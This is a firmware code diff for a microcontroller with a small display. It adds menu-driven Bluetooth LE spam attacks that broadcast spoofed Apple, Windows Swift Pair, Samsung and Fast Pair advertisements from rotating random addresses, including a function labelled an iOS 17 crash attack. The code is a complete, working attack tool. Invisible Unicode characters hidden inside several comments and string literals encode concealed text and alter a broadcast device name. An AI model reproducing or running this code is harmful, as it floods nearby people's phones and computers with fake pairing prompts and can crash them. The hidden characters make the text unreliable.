+    bleBeaconBroadcast(BLE_CATEGORY_HUAWEI);
+  }
+}
+
+void bleBeaconGoogleAction() {
+  if (showConfirmModal("启动Google设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_GOOGLE);
+  }
+}
+
+void bleBeaconMiscAction() {
+  if (showConfirmModal("启动罕见设备广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_MISC);
+  }
+}
+
+void bleBeaconMixedAction() {
+  if (showConfirmModal("启动米家大杂烩广播")) {
+    bleBeaconBroadcast(BLE_CATEGORY_MIXED);
+  }
+}
+
+// ===== Enhanced BLE Beacon Broadcast Function =====
+void bleBeaconBroadcast(BleDeviceCategory category) {
+  const BleBeaconDevice* devices = nullptr;
+  int deviceCount = 0;
+  const char* categoryName = "";
+  
+  // 根据类别选择设备数组
+  switch (category) {
+    case BLE_CATEGORY_APPLE:
+      devices = g_appleDevices;
+      deviceCount = g_appleDeviceCount;
+      categoryName = "Apple全家桶";
+      break;
+    case BLE_CATEGORY_XIAOMI:
+      devices = g_xiaomiDevices;
+      deviceCount = g_xiaomiDeviceCount;
+      categoryName = "小米全家桶";
+      break;
+    case BLE_CATEGORY_TOY:
+      devices = g_toyDevices;
+      deviceCount = g_toyDeviceCount;
+      categoryName = "儿童玩具";
+      break;
+    case BLE_CATEGORY_HUAWEI:
+      devices = g_huaweiDevices;
+      deviceCount = g_huaweiDeviceCount;
+      categoryName = "华为全家桶";
+      break;
+    case BLE_CATEGORY_GOOGLE:
+      devices = g_googleDevices;
+      deviceCount = g_googleDeviceCount;
+      categoryName = "Google全家桶";
+      break;
+    case BLE_CATEGORY_MIXED:
+      devices = g_mixedDevices;
+      deviceCount = g_mixedDeviceCount;
+      categoryName = "米家大杂烩";
+      break;
+    case BLE_CATEGORY_MISC:
+      devices = g_miscDevices;
+      deviceCount = g_miscDeviceCount;
+      categoryName = "罕见设备";
+      break;
+    default:
+      return;
+  }
+  
+  // OLED UI: 显示状态
+  display.clearDisplay();
+  u8g2_for_adafruit_gfx.setFontMode(1);
+  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+  oledDrawCenteredLine("[蓝牙信标发送]", 12);
+  
+  char statusBuf[32];
+  snprintf(statusBuf, sizeof(statusBuf), "广播: %s", categoryName);
+  oledDrawCenteredLine(statusBuf, 26);
+  oledDrawCenteredLine("按BACK退出", 60);
+  display.display();
+
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+
+  // 初始化BLE并配置非连接广播 - 优化广播频率
+  BLE.init();
+  BLE.setDeviceName("BW16-BLE");
+  BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_GENERIC_COMPUTER);
+
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(20);  // 优化：从50ms减少到20ms
+  BLE.configAdvert()->setMaxInterval(40);  // 优化：从120ms减少到40ms
+
+  // 启动外围模式（仅广播，不可连接）
+  BLE.beginPeripheral();
+
+  // 生成静态随机地址池 - 增加地址数量提高多样性
+  const uint8_t maxClones = 32; // 优化：从32增加到64
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+  
+  // 确保广播使用随机本地地址类型
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+
+  // 优化：减少切换延时，提高切换速度
+  const uint16_t perCloneMs = 50; // 优化：从100ms减少到50ms
+  uint8_t addrIdx = 0;
+  
+  // 优化：创建设备索引数组，实现真正的随机化避免连续相同设备
+  static int deviceIndices[64]; // 增加数组大小支持更多设备
+  int maxDeviceIndices = std::min(64, deviceCount * 8); // 每个设备重复8次，增加多样性
+  
+  // 初始化设备索引数组，确保每个设备都有足够的重复
+  for (int i = 0; i < maxDeviceIndices; i++) {
+    deviceIndices[i] = i % deviceCount;
+  }
+  
+  // 使用改进的Fisher-Yates洗牌算法，确保真正的随机分布
+  for (int i = maxDeviceIndices - 1; i > 0; i--) {
+    int j = random(0, i + 1);
+    int temp = deviceIndices[i];
+    deviceIndices[i] = deviceIndices[j];
+    deviceIndices[j] = temp;
+  }
+  
+  // 额外验证：确保相邻设备不重复
+  for (int i = 1; i < maxDeviceIndices; i++) {
+    if (deviceIndices[i] == deviceIndices[i-1]) {
+      // 如果发现重复，与后面的设备交换
+      for (int j = i + 1; j < maxDeviceIndices; j++) {
+        if (deviceIndices[j] != deviceIndices[i-1]) {
+          int temp = deviceIndices[i];
+          deviceIndices[i] = deviceIndices[j];
+          deviceIndices[j] = temp;
+          break;
+        }
+      }
+    }
+  }
+  
+  int deviceArrayIdx = 0;
+  
+  unsigned long lastDisplayUpdate = 0;
+  const unsigned long displayUpdateInterval = 300; // 优化：减少显示更新间隔
+
+  while (true) {
+    if (digitalRead(BTN_BACK) == LOW) { 
+      delay(200); 
+      break; 
+    }
+
+    // 停止当前广播以切换地址和设备信息
+    BLE.configAdvert()->stopAdv();
+
+    // 从池中设置下一个地址
+    le_set_rand_addr(addrPool[addrIdx]);
+    delay(5); // 优化：从20ms减少到5ms
+
+    // 构建广播载荷
+    BLEAdvertData cadv;
+    BLEAdvertData cscn;
+    
+    // 优化：使用智能设备选择算法，避免连续相同设备
+    int deviceIdx = deviceIndices[deviceArrayIdx];
+    
+    // 额外检查：如果当前设备与前一个相同，尝试选择不同的设备
+    static int lastDeviceIdx = -1;
+    if (deviceIdx == lastDeviceIdx && deviceCount > 1) {
+      // 尝试从当前索引开始找到下一个不同的设备
+      for (int i = 1; i < maxDeviceIndices; i++) {
+        int nextIdx = (deviceArrayIdx + i) % maxDeviceIndices;
+        if (deviceIndices[nextIdx] != lastDeviceIdx) {
+          deviceIdx = deviceIndices[nextIdx];
+          deviceArrayIdx = nextIdx; // 更新索引位置
+          break;
+        }
+      }
+    }
+    lastDeviceIdx = deviceIdx;
+    
+    const BleBeaconDevice& currentDevice = devices[deviceIdx];
+    
+    cadv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+    
+    // 添加设备名称（完整名称，必要时通过调整附加字段确保包长）
+    char namebuf[32];
+    snprintf(namebuf, sizeof(namebuf), "%s", currentDevice.name);
+    
+    cadv.addCompleteName(namebuf);
+    cadv.addAppearance(currentDevice.appearance);
+    // 为保证名称不被截断，优先移除可选字段以控制包大小
+    // 仅当名称较长时才添加完整服务UUID到扫描响应包
+    cscn.addCompleteServices(BLEUUID(currentDevice.service_uuid));
+    
+    // 将制造商数据移动到扫描响应，避免挤占广播包导致名称截断
+    uint8_t mfg[8];
+    mfg[0] = 7;
+    mfg[1] = 0xFF;
+    mfg[2] = (uint8_t)(currentDevice.company_id & 0xFF);
+    mfg[3] = (uint8_t)(currentDevice.company_id >> 8);
+    mfg[4] = deviceIdx;
+    mfg[5] = addrPool[addrIdx][3];
+    mfg[6] = addrPool[addrIdx][4];
+    mfg[7] = addrPool[addrIdx][5];
+    cscn.addData(mfg, sizeof(mfg));
+    
+    cscn.addAppearance(currentDevice.appearance);
+    
+    BLE.configAdvert()->setAdvData(cadv);
+    BLE.configAdvert()->setScanRspData(cscn);
+    BLE.configAdvert()->updateAdvertParams();
+
+    // 重新启动广播
+    BLE.configAdvert()->startAdv();
+    
+    // 更新显示（定期仅刷新设备名称区域，避免其他文字闪烁）
+    unsigned long now = millis();
+    if (now - lastDisplayUpdate >= displayUpdateInterval) {
+      u8g2_for_adafruit_gfx.setFontMode(1);
+      u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+      // 清除名称行所在区域再绘制（不清整屏），扩大清除高度防止重叠
+      display.fillRect(0, 32, display.width(), 20, SSD1306_BLACK);
+      oledDrawCenteredLine(namebuf, 44);
+      display.display();
+      lastDisplayUpdate = now;
+    }
+
+    // 等待指定时间
+    unsigned long start = millis();
+    while (millis() - start < perCloneMs) { 
+      if (digitalRead(BTN_BACK) == LOW) break; 
+      delay(5); // 优化：从10ms减少到5ms
+    }
+    
+    // 切换到下一个地址和设备
+    addrIdx = (uint8_t)((addrIdx + 1) % maxClones);
+    deviceArrayIdx = (deviceArrayIdx + 1) % maxDeviceIndices;
+    
+    // 优化：每轮结束后重新随机化设备顺序，使用改进的算法
+    if (deviceArrayIdx == 0) {
+      // 使用改进的Fisher-Yates洗牌算法
+      for (int i = maxDeviceIndices - 1; i > 0; i--) {
+        int j = random(0, i + 1);
+        int temp = deviceIndices[i];
+        deviceIndices[i] = deviceIndices[j];
+        deviceIndices[j] = temp;
+      }
+      
+      // 额外验证：确保相邻设备不重复
+      for (int i = 1; i < maxDeviceIndices; i++) {
+        if (deviceIndices[i] == deviceIndices[i-1]) {
+          // 如果发现重复，与后面的设备交换
+          for (int j = i + 1; j < maxDeviceIndices; j++) {
+            if (deviceIndices[j] != deviceIndices[i-1]) {
+              int temp = deviceIndices[i];
+              deviceIndices[i] = deviceIndices[j];
+              deviceIndices[j] = temp;
+              break;
+            }
+          }
+        }
+      }
+    }
+  }
+
+  // 停止BLE并清理资源
+  Serial.println("停止BLE广播并清理资源...");
+  BLE.configAdvert()->stopAdv();
+  g_bleActiveAdvertising = false;
+  delay(100);
+  BLE.deinit();
+  g_bleResourcesInUse = false;
+  g_lastBleActivity = millis();
+  Serial.println("BLE资源清理完成");
+}
+
+// Common BLE init helper - 优化广播频率
+static void bleEnsureInitAndParams() {
+  // 标记BLE资源开始使用
+  g_bleResourcesInUse = true;
+  g_bleActiveAdvertising = false; // 初始状态
+  g_lastBleActivity = millis();
+  
+  BLE.init();
+  BLE.setDeviceName("BW16-BLE");
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  BLE.configAdvert()->setMinInterval(20);  // 优化：从40ms减少到20ms
+  BLE.configAdvert()->setMaxInterval(40);  // 优化：从60ms减少到40ms
+  BLE.beginPeripheral();
+  uint8_t local_bd_type = GAP_LOCAL_ADDR_LE_RANDOM;
+  le_adv_set_param(GAP_PARAM_ADV_LOCAL_ADDR_TYPE, sizeof(local_bd_type), &local_bd_type);
+}
+
+void blePopupMenu() {
+  // 定义弹窗功能菜单项
+  static const BleMenuItem popupMenuItems[] = {
+    {"iOS 设备配对弹窗", blePopupStart_iOS},
+    {"iOS Action Modal", blePopupStart_iOSActionModal},
+    {"iOS 17 崩溃攻击", blePopupStart_iOS17Crash},
+    {"Windows Swift Pair", blePopupStart_WindowsSwiftPair},
+    {"三星EasySetup", blePopupStart_SamsungEasySetup},
+    {"↓部分设备有效↓", blePopupShowFastPairInfo},
+    {"Google快速配对", blePopupStart_AndroidFastPair},
+    {"小米/红米快速配对", blePopupStart_XiaomiFastPair},
+    {"一加快速配对", blePopupStart_OnePlusFastPair},
+    {"华为快速配对", blePopupStart_HuaweiFastPair},
+    {"OPPO快速配对", blePopupStart_OppoFastPair},
+    {"realme快速配对", blePopupStart_RealmeFastPair}
+  };
+  static const int popupMenuCount = sizeof(popupMenuItems) / sizeof(popupMenuItems[0]);
+  
+  showGenericBleMenu("", popupMenuItems, popupMenuCount);
+}
+
+// iOS popup
+// Apple Proximity Pair devices (from fl-BLE_SPAM)
+void blePopupStart_iOS() {
+  const char* title = "[iOS 设备配对弹窗]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Apple device models for Proximity Pair
+  const uint16_t appleModels[] = {
+    0x0E20, // AirPods Pro
+    0x0620, // Beats Solo 3
+    0x0A20, // AirPods Max
+    0x1020, // Beats Flex
+    0x0055, // Airtag
+    0x0030, // Hermes Airtag
+    0x0220, // AirPods
+    0x0F20, // AirPods 2nd Gen
+    0x1320, // AirPods 3rd Gen
+    0x1420, // AirPods Pro 2nd Gen
+    0x0320, // Powerbeats 3
+    0x0B20, // Powerbeats Pro
+    0x0C20, // Beats Solo Pro
+    0x1120, // Beats Studio Buds
+    0x0520, // Beats X
+    0x0920, // Beats Studio 3
+    0x1720, // Beats Studio Pro
+    0x1220, // Beats Fit Pro
+    0x1620, // Beats Studio Buds+
+  };
+  const size_t modelCount = sizeof(appleModels) / sizeof(appleModels[0]);
+
+  const uint8_t maxClones = 24; // 优化：从12增加到24提高多样性
+  static uint8_t addrPool[maxClones][6];
+  for (uint8_t i = 0; i < maxClones; i++) {
+    if (le_gen_rand_addr(GAP_RAND_ADDR_STATIC, addrPool[i]) != GAP_CAUSE_SUCCESS) {
+      le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, addrPool[i]);
+    }
+  }
+
+  uint8_t idx = 0;
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    le_set_rand_addr(addrPool[idx]);
+    delay(2); // 优化：减少切换延时
+
+    // Build Apple Continuity Proximity Pair packet
+    uint16_t model = appleModels[random(0, modelCount)];
+    uint8_t prefix = (model == 0x0055 || model == 0x0030) ? 0x05 : 0x01;
+    
+    uint8_t packet[31];
+    uint8_t i = 0;
+    
+    packet[i++] = 30; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x07; // Continuity Type (Proximity Pair)
+    packet[i++] = 25; // Continuity Size
+    packet[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
+    packet[i++] = (model >> 8) & 0xFF; // Model high byte
+    packet[i++] = model & 0xFF; // Model low byte
+    packet[i++] = 0x55; // Status
+    packet[i++] = ((random(0, 10) << 4) + random(0, 10)); // Buds Battery Level
+    packet[i++] = ((random(0, 8) << 4) + random(0, 10)); // Charging Status and Battery Case Level
+    packet[i++] = random(0, 256); // Lid Open Counter
+    packet[i++] = 0x00; // Device Color
+    packet[i++] = 0x00;
+    // Encrypted Payload (16 bytes random)
+    for (int j = 0; j < 16; j++) {
+      packet[i++] = random(0, 256);
+    }
+
+    BLEAdvertData adv;
+    adv.addData(packet, 31);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+    idx = (uint8_t)((idx + 1) % maxClones);
+  }
+  performCompleteBleCleanup();
+}
+
+// iOS Action Modal (from fl-BLE_SPAM)
+void blePopupStart_iOSActionModal() {
+  const char* title = "[iOS Action Modal]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Action types from fl-BLE_SPAM
+  const uint8_t actions[] = {
+    0x13, // AppleTV AutoFill
+    0x27, // AppleTV Connecting...
+    0x20, // Join This AppleTV?
+    0x19, // AppleTV Audio Sync
+    0x1E, // AppleTV Color Balance
+    0x09, // Setup New iPhone
+    0x02, // Transfer Phone Number
+    0x0B, // HomePod Setup
+    0x01, // Setup New AppleTV
+    0x06, // Pair AppleTV
+    0x0D, // HomeKit AppleTV Setup
+    0x2B, // AppleID for AppleTV?
+  };
+  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);
+
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; 
+    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
+    le_set_rand_addr(rnd);
+
+    // Build Apple Continuity Nearby Action packet
+    uint8_t action = actions[random(0, actionCount)];
+    uint8_t flag = 0xC0;
+    
+    // Special flag handling from fl-BLE_SPAM
+    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
+    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
+    
+    uint8_t packet[11];
+    uint8_t i = 0;
+    
+    packet[i++] = 10; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
+    packet[i++] = 5; // Continuity Size
+    packet[i++] = flag; // Action Flags
+    packet[i++] = action; // Action Type
+    // Authentication Tag (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+
+    BLEAdvertData adv;
+    adv.addData(packet, 11);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// iOS 17 Crash (from fl-BLE_SPAM)
+void blePopupStart_iOS17Crash() {
+  const char* title = "[iOS 17 崩溃攻击]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Action types for crash payload
+  const uint8_t actions[] = {
+    0x13, // AppleTV AutoFill
+    0x27, // AppleTV Connecting...
+    0x20, // Join This AppleTV?
+    0x19, // AppleTV Audio Sync
+    0x1E, // AppleTV Color Balance
+    0x09, // Setup New iPhone
+    0x02, // Transfer Phone Number
+    0x0B, // HomePod Setup
+    0x01, // Setup New AppleTV
+    0x06, // Pair AppleTV
+    0x0D, // HomeKit AppleTV Setup
+    0x2B, // AppleID for AppleTV?
+  };
+  const size_t actionCount = sizeof(actions) / sizeof(actions[0]);
+
+  unsigned long lastDisplayUpdate = 0;
+  
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; 
+    le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); 
+    le_set_rand_addr(rnd);
+
+    // Build iOS 17 crash packet (Custom Crash from fl-BLE_SPAM)
+    uint8_t action = actions[random(0, actionCount)];
+    uint8_t flag = 0xC0;
+    
+    if (action == 0x20 && random(0, 2)) flag--; // More spam for 'Join This AppleTV?'
+    if (action == 0x09 && random(0, 2)) flag = 0x40; // Glitched 'Setup New Device'
+    
+    uint8_t packet[17];
+    uint8_t i = 0;
+    
+    packet[i++] = 16; // Size
+    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
+    packet[i++] = 0x4C; // Company ID (Apple, Inc.)
+    packet[i++] = 0x00; // ...
+    packet[i++] = 0x0F; // Continuity Type (Nearby Action)
+    packet[i++] = 0x05; // Continuity Size
+    packet[i++] = flag; // Action Flags
+    packet[i++] = action; // Action Type
+    // Authentication Tag (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    
+    packet[i++] = 0x00; // Terminator (?)
+    packet[i++] = 0x00; // ...
+    
+    packet[i++] = 0x10; // Continuity Type (Nearby Info)
+    // Shenanigans (3 bytes random)
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+    packet[i++] = random(0, 256);
+
+    BLEAdvertData adv;
+    adv.addData(packet, 17);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// 占位页面：显示提示文本，任意键返回
+void blePlaceholderPage() {
+  while (true) {
+    display.clearDisplay();
+    u8g2_for_adafruit_gfx.setFontMode(1);
+    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
+    u8g2_for_adafruit_gfx.setFont(u8g2_font_wqy12_t_gb2312);
+    const char* msg = "关注永雏塔菲喵";
+    int w = u8g2_for_adafruit_gfx.getUTF8Width(msg);
+    int x = (display.width() - w) / 2; if (x < 0) x = 0;
+    int y = (display.height() / 2) + 4; // 基线微调
+    u8g2_for_adafruit_gfx.setCursor(x, y);
+    u8g2_for_adafruit_gfx.print(msg);
+    display.display();
+    // 任意键退出
+    if (digitalRead(BTN_BACK) == LOW || digitalRead(BTN_OK) == LOW || digitalRead(BTN_UP) == LOW || digitalRead(BTN_DOWN) == LOW) { delay(200); break; }
+    delay(10);
+  }
+}
+
+// W󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠indows Swift Pair popup (simplified)
+void blePopupStart_WindowsSwiftPair() {
+  const char* title = "[Windows Swift Pair]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const char* names[] = {"www.无名.top","ごとう ひとり","いじちにじか","やまだ リョウ","きた いくよ","因幡めぐる","Ciallo～(∠・ω< )⌒☆"};
+  const size_t nameCount = sizeof(names)/sizeof(names[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    const char* nm = names[(size_t)random(0, (int)nameCount)];
+    size_t nlen = strlen(nm); if (nlen > 20) nlen = 20;
+
+    // Build Manufacturer S󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣pecific: Company ID 0x0006 (Micro󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣soft)
+    uint8_t buf[31];
+    uint8_t L = (uint8_t)(1 + 2 + 3 + nlen);
+    if (L > 0x1F) L = 0x1F;
+    buf[0] = L; buf[1] = 0xFF; buf[2] = 0x06; buf[3] = 0x00; buf[4]=0x03; buf[5]=0x00; buf[6]=0x80;
+    memcpy(&buf[7], nm, nlen);
+
+    BLEAdvertData adv; adv.addData(buf, (uint8_t)(L+1));
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    // 使用󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标准的延时循环，支持速率控制按键
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// Android Fast Pair (simplified)
+void blePopupStart_AndroidFastPair() {
+  const char* title = "[Android Fast Pair]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+  unsigned long lastDisplayUpdate = 0;
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+    // Service Data UUID FE2C + random model id
+    uint8_t sd[8] = {6,0x16,0x2C,0xFE,(uint8_t)random(0,256),(uint8_t)random(0,256),(uint8_t)random(0,256)};
+    BLEAdvertData adv; adv.addData(sd, 7);
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(adv);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+    
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+// Extended BLE popup start functions (ported from backup, adapted to current style)
+
+void blePopupStart_SamsungEasySetup() {
+  const char* title = "[三星 EasySetup]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  const char* names[] = {"Gal󠅗󠅙󠅤󠅘󠅥󠅒󠄞󠅓󠅟󠅝󠄟󠄶󠅜󠅩󠅙󠅞󠅗󠄹󠅓󠅕󠅩󠅩󠅔󠅣󠄟󠄲󠅇󠄡󠄦󠄝󠅄󠅟󠅟󠅜󠅣axy Buds","Galaxy Buds2","Galaxy Buds Pro","Galaxy Watch"};
+  const size_t nameCount = sizeof(names)/sizeof(names[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+    
+    BLE.configAdvert()->stopAdv();
+
+    // Use non-resolvable random address to avoid caching issues
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv;
+    // Add flags first (LE General Discoverable + BR/EDR Not Supported)
+    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+
+    // Manufacturer Specific (Samsung = 0x0075)
+    // Minimal plausible EasySetup beacon payload (preamble + random bytes)
+    const char* nm = names[(size_t)random(0,(int)nameCount)];
+
+    uint8_t payload[12];
+    // Example preamble bytes
+    payload[0] = 0x01; // scenario/type
+    payload[1] = 0x00; // flags
+    payload[2] = 0x00; // reserved
+    payload[3] = 0x00; // reserved
+    // random bytes to vary frame
+    for (int i=4;i<12;i++) payload[i] = (uint8_t)random(0,256);
+
+    // Build AD structure: len = 1(type)+2(company)+payload_len
+    const uint8_t payload_len = sizeof(payload);
+    const uint8_t L = (uint8_t)(1 + 2 + payload_len);
+    uint8_t mfg[1 + 1 + 2 + sizeof(payload)];
+    mfg[0] = L; mfg[1] = 0xFF; // Manufacturer Specific
+    mfg[2] = 0x75; mfg[3] = 0x00; // Samsung company ID (LSB first)
+    memcpy(&mfg[4], payload, payload_len);
+    adv.addData(mfg, sizeof(mfg));
+
+    // Put device name into scan response
+    BLEAdvertData scan;
+    scan.addCompleteName(nm);
+
+    BLE.configAdvert()->setAdvData(adv);
+    BLE.configAdvert()->setScanRspData(scan);
+    BLE.configAdvert()->updateAdvertParams();
+    BLE.configAdvert()->startAdv();
+
+    unsigned long start = millis();
+    unsigned long currentDelay = std::max(20UL, (unsigned long)getBlePopupDelay() / 2); // 优化：减少延迟时间
+    while (millis() - start < currentDelay) { 
+      if (handleBlePopupDelayLoop(title, lastDisplayUpdate)) break;
+      delay(5); // 优化：从10ms减少到5ms
+    }
+  }
+  performCompleteBleCleanup();
+}
+
+void blePopupStart_XiaomiFastPair() {
+  const char* title = "[小米/红米 快速配对]";
+  drawBlePopupDisplay(title);
+
+  bleEnsureInitAndParams();
+
+  // Xiaomi/Redmi Model IDs (3-byte Fast Pair Model IDs)
+  const uint8_t xiaomiModels[][3] = {
+    {0x8E,0x61,0xC1}, // Redmi Buds 4 lite (8E61C1)
+    {0x6C,0x52,0x1F}  // Redmi Buds 4 Active (6C521F)
+  };
+  const size_t modelCount = sizeof(xiaomiModels)/sizeof(xiaomiModels[0]);
+  unsigned long lastDisplayUpdate = 0;
+
+  while (true) {
+    if (handleBlePopupMainLoop(title, lastDisplayUpdate)) break;
+
+    BLE.configAdvert()->stopAdv();
+
+    // Randomize advertiser address (non-resolvable)
+    uint8_t rnd[6]; le_gen_rand_addr(GAP_RAND_ADDR_NON_RESOLVABLE, rnd); le_set_rand_addr(rnd);
+
+    BLEAdvertData adv;
+    // Flags
+    adv.addFlags(GAP_ADTYPE_FLAGS_LIMITED | GAP_ADTYPE_FLAGS_BREDR_NOT_SUPPORTED);
+
+    // 1) Service UUID List (16-bit) -> FE2C (Google Fast Pair)
+    uint8_t suuid[4];
+    suuid[0] = 3;      // length of (type + 2-byte UUID)
+    suuid[1] = 0x03;   // Complete List of 16-bit Service Class UUIDs
+    suuid[2] = 0x2C;   // UUID LSB
+    suuid[3] = 0xFE;   // UUID MSB
+    adv.addData(suuid, sizeof(suuid));
+
+    // 2) Service Data (UUID FE2C + Model ID)
+    const uint8_t* mid = xiaomiModels[(size_t)random(0,(int)modelCount)];
+    uint8_t sdata[8];
+    sdata[0] = 6;      // length of (type + 2-byte UUID + 3-byte model)
